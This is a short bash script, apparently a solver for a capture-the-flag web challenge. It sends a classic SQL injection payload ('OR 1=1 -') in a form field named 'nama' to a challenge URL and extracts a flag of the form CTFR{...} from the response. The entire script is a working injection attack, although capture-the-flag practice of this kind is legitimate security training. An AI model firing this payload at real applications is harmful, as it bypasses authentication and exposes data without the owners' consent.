#!/bin/bash

curl -s -X POST -F "nama='OR 1=1 -'" https://web.ctf.rasyidmf.com/chal11/ | grep -oE CTFR{.*}
